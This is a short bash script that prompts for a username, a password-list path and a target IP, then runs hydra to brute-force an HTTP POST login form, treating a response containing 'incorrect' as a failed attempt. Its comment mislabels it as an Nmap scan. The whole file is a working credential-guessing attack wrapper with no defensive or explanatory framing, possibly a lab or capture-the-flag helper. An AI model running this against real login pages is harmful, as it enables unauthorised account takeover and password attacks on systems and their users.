
#! /bin/bash

 #Take variables for Nmap Scan
echo Enter the username 

read var1

echo Enter the full directory path

read var2 

echo Enter IP address 

read var3

hydra -l $var1 -P $var2 $var3 http-post-form "/username=^USER^&password=^PASS^:F=incorrect" -V


